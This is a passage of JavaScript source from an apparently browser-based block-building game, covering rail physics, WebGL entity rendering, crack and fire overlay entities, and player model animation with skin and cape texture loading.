				}else if((onBlock & isState) === SLAB){//raised
					let diagonal = sqrt(0.5)
					let originX = railX, originY = railY, originZ = railZ, dx = 0, dy = diagonal, dz = 0
					if(rot === NORTH) originZ -= 0.5, dz = diagonal, this.yaw = round(this.yaw/Math.PI)*Math.PI
					else if(rot === SOUTH) originZ += 0.5, dz = -diagonal, this.yaw = round(this.yaw/Math.PI)*Math.PI
					else if(rot === EAST) originX -= 0.5, dx = diagonal, this.yaw = round((this.yaw-Math.PI2)/Math.PI)*Math.PI+Math.PI2
					else if(rot === WEST) originX += 0.5, dx = -diagonal, this.yaw = round((this.yaw-Math.PI2)/Math.PI)*Math.PI+Math.PI2
					let dot = (this.x-originX)*dx + (this.z-originZ)*dz + (this.y-originY)*dy
					this.x = originX+dx*dot
					this.y = originY+dy*dot
					this.z = originZ+dz*dot
					let velMag = sqrt(velx*velx+velz*velz+vely*vely)
					let prevDir = velx*dx + velz*dz + vely*dy//more accurate if use previous dx and dz
					if(prevOnTrack){
						prevDir = Math.sign(prevDir)
						this.velx = velMag*dx*prevDir
						this.velz = velMag*dz*prevDir
						this.vely = velMag*dy*prevDir
					}else{
						this.velx = prevDir*dx
						this.velz = prevDir*dz
						this.vely = prevDir*dy
					}
					this.prevOnTrack = true
					this.height = this.heightOnDiagonal//to allow fitting
					this.pitch = -Math.PI4*Math.sign(sin(this.yaw)*dx+cos(this.yaw)*dz)
					this.offsetY = 0.25
				}else this.prevOnTrack = false
				if(this.yaw > Math.PId) this.yaw -= Math.PId, this.previousYaw -= Math.PId
				if(this.yaw < 0) this.yaw += Math.PId, this.previousYaw += Math.PId
				if(blockData[onBlock].name === "poweredRail"){
					let velMag = sqrt(velx*velx+velz*velz+vely*vely)
					if(onBlock&FLIP){
						if(velMag > 0.01 && velMag<8){
							let extraSpeed = (8-velMag)*0.06
							this.velx += this.velx/velMag*extraSpeed
							this.velz += this.velz/velMag*extraSpeed
							this.vely += this.vely/velMag*extraSpeed
							if((onBlock&isState) === CUBE){
								if(rot === NORTH || rot === SOUTH){
									if(blockData[this.world.getBlock(railX,railY,railZ+1)].solid) this.velz = min(this.velz,-0.1)
									else if(blockData[this.world.getBlock(railX,railY,railZ-1)].solid) this.velz = max(this.velz,0.1)
								}else if(rot === EAST || rot === WEST){
									if(blockData[this.world.getBlock(railX+1,railY,railZ)].solid) this.velx = min(this.velx,-0.1)
									else if(blockData[this.world.getBlock(railX-1,railY,railZ)].solid) this.velx = max(this.velx,0.1)
								}
							}
						}
					}else{
						this.velx *= 0.65
						this.velz *= 0.65
						this.vely *= 0.65
					}
				}
			}else this.prevOnTrack = false

			if(this.harmEffect > 0){
				this.harmEffect--
				this.roll = sin(this.harmEffect/3*Math.PI)*this.harmEffect*Math.PI*0.025
			}else this.roll = 0
		}
		render() {
      totalEntites++
      if(this.hidden || !p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      renderedEntities++
      
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1
			const offsetY = lerp(diff,this.prevOffsetY,this.offsetY)
      let renderx = (this.x - this.previousX) * diff + this.previousX
			let rendery = ((this.y - this.previousY) * diff + this.previousY) + offsetY
			let renderz = (this.z - this.previousZ) * diff + this.previousZ
      
			const modelMatrix = entityMatrices.modelMatrix;
			modelMatrix.identity()
			modelMatrix.translate(renderx, rendery, renderz)
			modelMatrix.rotY(lerp(diff,this.previousYaw,this.yaw))
			modelMatrix.rotX(lerp(diff,this.previousPitch,this.pitch))
			if(this.roll || this.previousRoll) modelMatrix.rotZ(lerp(diff,this.previousRoll,this.roll))
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			let projectionMatrix = entityMatrices.projectionMatrix
      projectionMatrix.set(proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0)
      projectionMatrix = projectionMatrix.elements
			const modelViewProjectionMatrix = entityMatrices.modelViewProjectionMatrix
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			const blockLight = this.glow ? 1 : this.world.getLight(x, y, z, 1, this.dimension)/15
			const skysLight = this.world.getLight(x, y, z, 0, this.dimension)/15
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, blockLight)
			gl.uniform1f(glCache.uSkylightEntity, skysLight)
      gl.uniform1f(glCache.harmEffectEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
		}
	}
  
  class crackEntity extends Entity{
    constructor(tex, x,y,z){
			const shape = shapes.cube
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size
			let blockSides = Object.keys(Block)
			let texture = []
			let index = 0
			for (let n = 0; n < 6; n++) {
				let side = blockSides[n]
				let directionalFaces = shapeVerts[n]
				for (let facei = 0; facei < directionalFaces.length; facei++) {
					let texVerts = textureCoords[textureMap[tex]]
					let tx = texVerts[0]
					let ty = texVerts[1]
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]
					texture[index + 1] = ty + texShapeVerts[1]
					texture[index + 2] = tx + texShapeVerts[2]
					texture[index + 3] = ty + texShapeVerts[3]
					texture[index + 4] = tx + texShapeVerts[4]
					texture[index + 5] = ty + texShapeVerts[5]
					texture[index + 6] = tx + texShapeVerts[6]
					texture[index + 7] = ty + texShapeVerts[7]
					index += 8
				}
			}
      super(x, y, z, 0, 0, 0, 0, 0, 1.01, 1.01, 1.01, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, Infinity)
      
      this.cached = {}
    }
    cacheTexture(tex){
			const shape = shapes.cube
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size
			let blockSides = Object.keys(Block)
			let texture = []
			let index = 0
			for (let n = 0; n < 6; n++) {
				let side = blockSides[n]
				let directionalFaces = shapeVerts[n]
				for (let facei = 0; facei < directionalFaces.length; facei++) {
					let texVerts = textureCoords[textureMap[tex]]
					let tx = texVerts[0]
					let ty = texVerts[1]
					let tw = texVerts[2] - tx
					let th = texVerts[5] - ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
					index += 8
				}
			}
      
      var vertices = new Float32Array(shapeVerts.flat(Infinity)),
          faces = size
      texture = new Float32Array(texture)
      
      this.vao = glExtensions.vertex_array_object.createVertexArrayOES()
			const verticesBuffer = gl.createBuffer()
			const textureBuffer = gl.createBuffer()
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

			gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

			gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
			gl.bufferData(gl.ARRAY_BUFFER, texture, gl.STATIC_DRAW)
			gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)
			
			gl.enableVertexAttribArray(glCache.aVertexEntity)
			gl.enableVertexAttribArray(glCache.aTextureEntity)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
      
      this.cached[tex] = this.vao
    }
    changeTexture(tex){
      this.vao = this.cached[tex]
    }
    render(){
      if(!p.camera.canSeeEntity(this.x,this.y,this.z,this.width,this.height,this.depth)) return
      const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(this.x, this.y, this.z)
			modelMatrix.rotX(this.pitch)
			modelMatrix.rotY(this.yaw)
			modelMatrix.scale(this.width, this.height, this.depth)
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			const x = round(this.x)
			const y = round(this.y)
			const z = round(this.z)
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, 1)
			gl.uniform1f(glCache.uSkylightEntity, 1)
			gl.uniform3f(glCache.uPosEntity, p.renderX-this.x, p.renderY-this.y, p.renderZ-this.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			gl.blendFunc(gl.DST_COLOR, gl.ZERO)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
			gl.blendFunc(gl.SRC_ALPHA, gl.ONE_MINUS_SRC_ALPHA)
    }
  }
  
  class EntityFire extends Entity{
    constructor(){
			const shape = shapes.entityFire
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size
			let blockSides = Object.keys(Block)
			let texture = []
			let index = 0
			for (let n = 0; n < 6; n++) {
				let side = blockSides[n]
				let directionalFaces = shapeVerts[n]
				for (let facei = 0; facei < directionalFaces.length; facei++) {
					let texVerts = textureCoords[textureMap["fire"]]
					let tx = texVerts[0]
					let ty = texVerts[1]
					let tw = texVerts[2]-tx
					let th = texVerts[5]-ty
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = tx + texShapeVerts[0]*tw
					texture[index + 1] = ty + texShapeVerts[1]*th
					texture[index + 2] = tx + texShapeVerts[2]*tw
					texture[index + 3] = ty + texShapeVerts[3]*th
					texture[index + 4] = tx + texShapeVerts[4]*tw
					texture[index + 5] = ty + texShapeVerts[5]*th
					texture[index + 6] = tx + texShapeVerts[6]*tw
					texture[index + 7] = ty + texShapeVerts[7]*th
					index += 8
				}
			}
      super(0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, new Float32Array(shapeVerts.flat(Infinity)), new Float32Array(texture), size, Infinity)
    }
    render(ent){ //for burning entities
      if(!ent) return
      
      let yaw = Math.PId - (atan2(p.camera.renderZ - ent.z, p.camera.renderX - ent.x) + Math.PI2 + Math.PI) //point to player
      let diff = (now - this.lastUpdate) / tickTime
			if (diff > 1) diff = 1

      const modelMatrix = new Matrix();
			modelMatrix.identity()
			modelMatrix.translate(lerp(diff,ent.previousX,ent.x), lerp(diff,ent.previousY,ent.y)+ent.offsetY, lerp(diff,ent.previousZ,ent.z))
			modelMatrix.rotY(yaw)
			//modelMatrix.rotX(pitch)
			modelMatrix.scale(ent.width*1.5, ent.height*1.5, ent.depth*1.5) //taller than the entity
			const viewMatrix = p.camera.transformation.elements
			const proj = p.camera.projection
			const projectionMatrix = [proj[0], 0, 0, 0, 0, proj[1], 0, 0, 0, 0, proj[2], proj[3], 0, 0, proj[4], 0]
			const modelViewProjectionMatrix = new Matrix()
			modelViewProjectionMatrix.identity()
			modelViewProjectionMatrix.mult(projectionMatrix)
			modelViewProjectionMatrix.mult(viewMatrix)
			modelViewProjectionMatrix.mult(modelMatrix.elements)
			// row major to column major
			modelViewProjectionMatrix.transpose()
			modelMatrix.transpose()//for normal
			gl.uniform1i(glCache.uSamplerEntity, 0)
			gl.uniform1f(glCache.uBlockLightEntity, 1)
			gl.uniform1f(glCache.uSkylightEntity, 1)
    	gl.uniform1i(glCache.useNormalsEntity, 0)
			gl.uniform3f(glCache.uPosEntity, p.renderX-ent.x, p.renderY-ent.y, p.renderZ-ent.z)
			gl.uniformMatrix4fv(glCache.uViewEntity, false, modelViewProjectionMatrix.elements)
			gl.uniformMatrix4fv(glCache.uModelMatEntity, false, modelMatrix.elements)
			glExtensions.vertex_array_object.bindVertexArrayOES(this.vao)
			gl.drawElements(gl.TRIANGLES, 6 * this.faces, gl.UNSIGNED_INT, 0)
			glExtensions.vertex_array_object.bindVertexArrayOES(null)
    	gl.uniform1i(glCache.useNormalsEntity, 1)
    }
  }
  
  class Player extends Entity{
		type = "Player"
    constructor(noExtrapolate){
			super(0, 0, 0, 0, 0, 0, 0, 0, pW*2, pDefaultBottomH+pTopH, pW*2, null, null, 0, Infinity)

			this.actualSize = (pDefaultBottomH+pTopH)/2
      
      let pix = 1/16
      
			this.lastPos = now
			this.targetRx = 0
			this.targetRy = 0
      this.rx = 0
      this.ry = 0
      this.bodyRot = 0
      this.die = false
      
      this.sneaking = false
      this.walking = false
      this.sprinting = false
      this.eating = false
      this.sleeping = false
      this.sitting = false
      this.swimming = false
      this.usingItem = false
      
      this.prevWalking = false
			this.walkAmount = 0
			this.walkCount = 0
      this.prevSwimming = false
      this.swimStart = 0
      
			let part = this.generateVAO(shapes.playerBody, 0,0)
      this.addPart("body",part.size,part.vao,0,0,0,1,1,1,0,0)

      part = this.generateVAO(shapes.playerHead,0,0)
      this.addPart("head",part.size,part.vao,0,pix*6,0,1,1,1,0,0)
      
      part = this.generateVAO(shapes.playerLeftArm,0,0)
      this.addPart("leftArm",part.size,part.vao,pix*4,pix*6,0,1,1,1,0,0)
      part = this.generateVAO(shapes.playerRightArm,0,0)
      this.addPart("rightArm",part.size,part.vao,pix*-4,pix*6,0,1,1,1,0,0)
      
      part = this.generateVAO(shapes.playerLeftLeg,0,0)
      this.addPart("leftLeg",part.size,part.vao,pix*2,pix*-6,0,1,1,1,0,0)
      part = this.generateVAO(shapes.playerRightLeg,0,0)
      this.addPart("rightLeg",part.size,part.vao,pix*-2,pix*-6,0,1,1,1,0,0)
      
      part = this.generateVAO(shapes.cape,0,0,0.25,0.5)
      this.addPart("cape",part.size,part.vao,0,pix*6,pix*-3,1,1,1,0,0)
      
      this.holding = 0 //shown in the hand, it is set to the blockid for the block the player is holding
      this.prevHolding = 0
      this.holdRot = Math.PI / -10
      if(blockData) part = generateBlockVAO(this.holding)
      this.addPart("holding",part.size,part.vao,0, 0, 0, 1,1,1, 0, 0)
      
      this.walkRot = 0
      this.punchEffect = 0
      this.pOffsetry = this.offsetry = 0
      this.offsetZ = this.pOffsetZ = 0
      
      this.skinSet = false
      this.skinURL = null
      this.skinTex = defaultSkinTexture
      this.capeSet = false
      this.capeURL = null
      this.capeTex = null
      
      this.nameText = null
      this.previousText = null
      this.username = null
      this.afk = false

			this.scale = 1
			this.prevScale = null
			this.noExtrapolate = noExtrapolate
    }
		get survival(){return this.gameMode==="survival"||this.gameMode==="hardcore"}
		get spectator(){return this.gameMode==="spectator"}
    setSkin(url){
			if(this.skinURL) gl.deleteTexture(this.skinTex)
      this.skinSet = true
      this.skinURL = url
			this.skinTex = defaultSkinTexture
      if(!url) return //some people don't have skins. prevent it from breaking
      let image = new Image()
      let me = this
      image.onload = function(){
        gl.activeTexture(gl.TEXTURE7)
				let skinTexture = gl.createTexture()
				gl.bindTexture(gl.TEXTURE_2D, skinTexture)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
      	gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, image)
				me.skinTex = skinTexture
      }
      image.src = url
    }
    setCape(url){
			if(this.capeURL) gl.deleteTexture(this.capeTex)
      this.capeSet = true
      this.capeURL = url
			this.capeTex = null
      if(!url) return
      let image = new Image()
      let me = this
      image.onload = function(){
        gl.activeTexture(gl.TEXTURE7)
				let capeTexture = gl.createTexture()
				gl.bindTexture(gl.TEXTURE_2D, capeTexture)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE)
				gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE)
      	gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, image)
				me.capeTex = capeTexture
      }
      image.src = url
    }
		delete(){
			if(this.skinURL) gl.deleteTexture(this.skinTex)
			if(this.capeURL) gl.deleteTexture(this.capeTex)
		}
    generateVAO(shape, tx, ty, xScale, yScale){
      if(!xScale) xScale = 0.25
      if(!yScale) yScale = 0.25
			const shapeVerts = shape.verts
			const shapeTexVerts = shape.texVerts
			const size = shape.size
			const shapeNormal = shape.normal
			let blockSides = Object.keys(Block)
			let texNum = 0
			let texture = []
			let index = 0
			let normal = []
			for (let n = 0; n < 6; n++) {
				let side = blockSides[n]
				let directionalFaces = shapeVerts[n]
				for (let facei = 0; facei < directionalFaces.length; facei++) {
					let texShapeVerts = shapeTexVerts[n][facei]
					texture[index    ] = (tx + texShapeVerts[0]) * xScale
					texture[index + 1] = (ty + texShapeVerts[1]) * yScale
					texture[index + 2] = (tx + texShapeVerts[2]) * xScale
					texture[index + 3] = (ty + texShapeVerts[3]) * yScale
					texture[index + 4] = (tx + texShapeVerts[4]) * xScale
					texture[index + 5] = (ty + texShapeVerts[5]) * yScale
					texture[index + 6] = (tx + texShapeVerts[6]) * xScale
					texture[index + 7] = (ty + texShapeVerts[7]) * yScale
					index += 8
					normal.push(...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei],...shapeNormal[n][facei])
				}
				texNum++
			}
      var vao = glExtensions.vertex_array_object.createVertexArrayOES()
      const verticesBuffer = gl.createBuffer()
      const textureBuffer = gl.createBuffer()
      const normalBuffer = gl.createBuffer()
      glExtensions.vertex_array_object.bindVertexArrayOES(vao)
      gl.bindBuffer(gl.ELEMENT_ARRAY_BUFFER, indexBuffer)

      gl.bindBuffer(gl.ARRAY_BUFFER, verticesBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(shapeVerts.flat(Infinity)), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aVertexEntity, 3, gl.FLOAT, false, 0, 0)

      gl.bindBuffer(gl.ARRAY_BUFFER, textureBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(texture), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aTextureEntity, 2, gl.FLOAT, false, 0, 0)

			gl.bindBuffer(gl.ARRAY_BUFFER, normalBuffer)
      gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(normal), gl.STATIC_DRAW)
      gl.vertexAttribPointer(glCache.aNormalEntity, 3, gl.FLOAT, false, 0, 0)

      gl.enableVertexAttribArray(glCache.aVertexEntity)
      gl.enableVertexAttribArray(glCache.aTextureEntity)
      gl.enableVertexAttribArray(glCache.aNormalEntity)
      glExtensions.vertex_array_object.bindVertexArrayOES(null)
      return {vao, size}
    }
    update(){
      var pix = 1 / 16
      var armRot = (sin((now - this.spawn) / 1000) / 2 + 0.5) * Math.PI / 40
      
      if(this.harmEffect > 0){
        this.harmEffect -= 3
      }
      if(this.die){
        this.dieEffect += 0.05
        if(this.dieEffect > 1){
          this.hidden = true
					this.dieEffect = 1
        }
        this.dieRotate = (this.dieEffect**4)*Math.PI2
      }else{
				this.dieEffect = 0
				this.dieRotate = 0
			}
      
			if(!this.noExtrapolate){
				this.lastUpdate = now
				this.previousX = this.x
				this.previousY = this.y
				this.previousZ = this.z
				let diff = (now - this.lastPos) / tickTime
				if(diff > 10) diff = 10
				this.x = this.targetX+this.velx*diff
				this.y = this.targetY+this.vely*diff
				this.z = this.targetZ+this.velz*diff
				this.rx = this.targetRx
				this.ry = this.targetRy
			}
      this.previousPitch = this.pitch
      this.previousYaw = this.yaw
      this.yaw = -this.bodyRot
      if(this.yaw - this.previousYaw > Math.PI) this.previousYaw += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
      if(this.yaw - this.previousYaw < -Math.PI) this.previousYaw -= Math.PId

			if(this.scale !== this.prevScale){
				this.prevScale = this.scale
				let s = this.scale
				this.width = this.depth = pW*2*s
				this.defaultHeight = this.height = (pDefaultBottomH+pTopH)*s
				this.sitHeight = (pSitBottomH+pTopH)*s
				this.sneakHeight = (pSneakBottomH+pTopH)*s
				this.swimHeight = (pSwimBottomH+pTopH)*s
        this.defaultOffsetY = pix*2*this.actualSize*s
        this.sitOffsetY = pix*-2.5*this.actualSize*s
        this.sneakOffsetY = pix*-1.5*this.actualSize*s
			}
			if(this.sneaking){
				this.height = this.sneakHeight
			}else if(this.eating || this.usingItem && blockData[this.holding].spyglass){
			}else if(this.sitting){
				this.height = this.sitHeight
			}else if(this.swimming){
				this.height = this.swimHeight
			}else if(!this.sprinting){
				this.height = this.defaultHeight
			}
      
      for(let p in this.parts){
        var part = this.parts[p]
        part.prx = part.rx
        part.pry = part.ry
        part.prz = part.rz
        part.pry2 = part.ry2
        part.lastUpdate = now
      }
      this.pOffsetry = this.offsetry
      
      if(this.swimming !== this.prevSwimming){
        this.prevSwimming = this.swimming
        this.swimStart = now
      }
      this.parts.head.rx = -this.rx
      this.parts.head.ry = 0
      this.parts.head.ry2 = -this.ry
      this.parts.leftLeg.ry2 = 0
      this.parts.rightLeg.ry2 = 0
      this.parts.leftLeg.y = this.parts.leftLeg.originalY
      this.parts.rightLeg.y = this.parts.rightLeg.originalY
      this.pOffsetZ = this.offsetZ
      this.offsetZ = 0
      if(this.sleeping){
        this.offsetY = 0
        this.pitch = -Math.PI2
      }else if(this.sitting){
        this.offsetY = this.sitOffsetY
        this.pitch = 0
        this.parts.leftLeg.rx = this.parts.rightLeg.rx = -Math.PI2
        this.parts.leftLeg.ry2 = Math.PI/8
        this.parts.rightLeg.ry2 = -Math.PI/8
      }else if(this.sneaking){
        this.offsetY = this.sneakOffsetY
        var rot = Math.PI / 6
        this.pitch = rot
        this.parts.leftLeg.rx = this.parts.rightLeg.rx = -rot
        this.parts.leftLeg.y += 0.25
        this.parts.rightLeg.y += 0.25
        this.offsetZ = -0.25
      }else if(this.swimming){
        this.offsetY = 0//this.defaultOffsetY
        this.parts.leftLeg.rx = this.parts.rightLeg.rx = 0
        if(now - this.swimStart < 250){
          this.pitch = lerp((now-this.swimStart)/250,0,Math.PI2-this.rx)
        }else{
          this.pitch = Math.PI2 - this.rx
        }
      }else{
        this.offsetY = this.defaultOffsetY
        this.pitch = 0
        this.parts.leftLeg.rx = this.parts.rightLeg.rx = 0
        if(now - this.swimStart < 500){
          this.pitch = lerp((now-this.swimStart)/500,Math.PI2-this.rx,0)
        }
      }
      
      if(this.parts.head.ry2 - this.parts.head.pry2 > Math.PI) this.parts.head.pry2 += Math.PId //prevent weird thing happening when rotation was 0 but is now 360
      if(this.parts.head.ry2 - this.parts.head.pry2 < -Math.PI) this.parts.head.pry2 -= Math.PId
      
      this.parts.leftArm.rz = armRot
      this.parts.rightArm.rz = -armRot
      
      var part = this.parts.holding
      if(this.holding !== this.prevHolding){
        this.prevHolding = this.holding
        var v = generateBlockVAO(this.holding)
        part.vao = v.vao
        part.size = v.size
      }
      this.parts.rightArm.rx = this.holdRot
      this.parts.leftArm.rx = 0 //if you change below, also change mob holding
      if(blockData[this.holding].tool){//part.size,part.vao,pix*-6, 0, pix*8, 0.25,0.25,0.25, this.holdRot, 0
        part.x = pix*-2
        part.y = pix*-12
        part.z = pix*6
        part.w = part.h = part.d = 1
        part.rx = Math.PI / 1.25
        part.ry = Math.PI * -0.5
      }else if(blockData[this.holding].name === "bow"){
        part.x = 0
        part.y = pix*-12
        part.z = 0
        part.w = part.h = part.d = 1
        part.rx = Math.PI / 1.25
        part.ry = Math.PI * -0.5
      }else if(blockData[this.holding].spyglass){
        part.x = pix*2
        part.y = pix*-10
        part.z = 0
        part.w = part.h = part.d = 1
        part.rx = -this.holdRot
        part.ry = 0
      }else if(blockData[this.holding].item){
        part.x = 0
        part.y = pix*-11
        part.z = pix*4
        part.w = part.h = part.d = 0.5
        part.rx = Math.PI2
        part.ry = 0
      }else if(this.holding){
        part.x = 0
        part.y = pix*-12
        part.z = pix*3
        part.w = part.h = part.d = 0.25
        part.rx = 0
        part.ry = Math.PI / 4
      }else{
        this.parts.rightArm.rx = 0
      }
      
      if(this.walking !== this.prevWalking){
        this.prevWalking = this.walking
				if(this.walking) this.walkCount = Math.random()>0.5 ? 0 : 1000, this.walkAmount = 1
      }
			let walkSpeed = dist2(this.x,this.z,this.previousX,this.previousZ)*500
			if(!this.walking && this.walkAmount > 0){
				this.walkAmount -= 0.2
				if(this.walkAmount<0) this.walkAmount = 0
			}
      if(this.walking && this.walkAmount === 1){
				this.walkCount += walkSpeed
        /*if(this.sprinting && !this.swimming){
          walkRotTarget = sin(((now - this.walkStart) / 250) * Math.PI) * Math.PI / 4
        }else if(this.sneaking && !this.swimming){
          walkRotTarget = sin((now - this.walkStart) / 220) * Math.PI / 4
        }else{
          walkRotTarget = sin(((now - this.walkStart) / 500/*437.5*-/) * Math.PI) * Math.PI / 4
        }*/
      }
      this.walkRot = this.walkAmount && sin(this.walkCount/1000*Math.PI)*this.walkAmount//lerp(0.5, this.walkRot, walkRotTarget)
      
      this.parts.leftLeg.rx += this.walkRot
      this.parts.rightLeg.rx -= this.walkRot
      if(this.swimming && this.walking){
        var swimCycle = (now - this.swimStart) % 2000
        if(swimCycle < 750){
          var a = swimCycle*Math.PI2/750
          this.parts.leftArm.rz += a
          this.parts.rightArm.rz -= a
        }else if(swimCycle < 1000){
          this.parts.leftArm.rz += Math.PI2
          this.parts.rightArm.rz -= Math.PI2
        }else if(swimCycle < 1500){
          var a = (500-(swimCycle-1000))*Math.PI2/500
          var b = (swimCycle-1000)*Math.PI2/500
          this.parts.leftArm.rx -= b
          this.parts.rightArm.rx -= b
          this.parts.leftArm.rz += a
          this.parts.rightArm.rz -= a
        }else{
          var b = (500-(swimCycle-1500))*Math.PI2/500
          this.parts.leftArm.rx -= b
          this.parts.rightArm.rx -= b
        }
      }else{
        this.parts.leftArm.rx += this.walkRot
        this.parts.rightArm.rx -= this.walkRot
      }
      
      if(this.punchEffect > 0){
        this.punchEffect -= 0.75
        if(this.punchEffect < 0) this.punchEffect = 0
        var punchEffect = this.punchEffect
        this.parts.rightArm.rx -= punchEffect*Math.PI/15
        this.parts.rightArm.ry2 = sin(punchEffect*Math.PI/10)*Math.PI*0.25
        //this.offsetry = this.parts.rightArm.ry2 / 3
      }else this.parts.rightArm.ry2 = 0
      this.parts.leftArm.ry2 = 0
      
      if(this.eating){
        this.parts.rightArm.rx -= Math.PI2 + (sin(((now - this.spawn) / 125) * Math.PI) / 16) - 0.5
        this.parts.rightArm.ry2 = Math.PI4
      }
      
      if(this.usingItem){
        if(blockData[this.holding].name === "bow"){
          this.parts.leftArm.rx = -Math.PI2
          this.parts.leftArm.ry2 = -Math.PI4
          this.parts.rightArm.rx = -Math.PI2
        }else if(blockData[this.holding].spyglass){
          this.parts.rightArm.rx = -Math.PI2+this.holdRot
        }else if(blockData[this.holding].sword){
          this.parts.rightArm.rx = -Math.PI2*0.8
					this.parts.holding.ry = Math.PI
					this.parts.holding.rx = Math.PI2
					this.parts.holding.y = pix*-10
					this.parts.holding.x = pix*5
				}
      }
      
      if(this.capeTex){
        var target
        if(this.walking){
          target = Math.PI2 + sin((now - this.spawn) / 200) * (Math.PI / 8)
        }else{
          target = (sin((now - this.spawn) / 1000) / 2 + 0.5) * (Math.PI / 16)
        }
        this.parts.cape.rx = lerp(0.125, this.parts.cape.rx, target)
      }

      let id = this.holding
      if(id && blockData[id].tint){
        let biome = world.getBiome(round(this.x),round(this.y),round(this.z),this.dimension)
        let tints = blockData[id].tint
        this.parts.holding.tint = tints[biome] || tints.default
      }else this.parts.holding.tint = null
			
      var text = (this.afk?"[Inactive] ":"")+this.username
      if(this.username && this.previousText !== text){
        this.previousText = text
        if(this.nameText){
          this.nameText.setText(this.previousText)
        }else{
          this.nameText = world.generateTextForEntity(this.previousText,this,1/4, null,[0,0,0,0.7])
        }
      }
      if(this.nameText) {
        this.nameText.update()
        this.nameText.dimension = this.dimension
        this.nameText.x = this.x
        this.nameText.y = this.y+this.height*0.5+0.25
        this.nameText.z = this.z
      }
    }
    setPos(x,y,z,vx,vy,vz){
      this.targetX = x
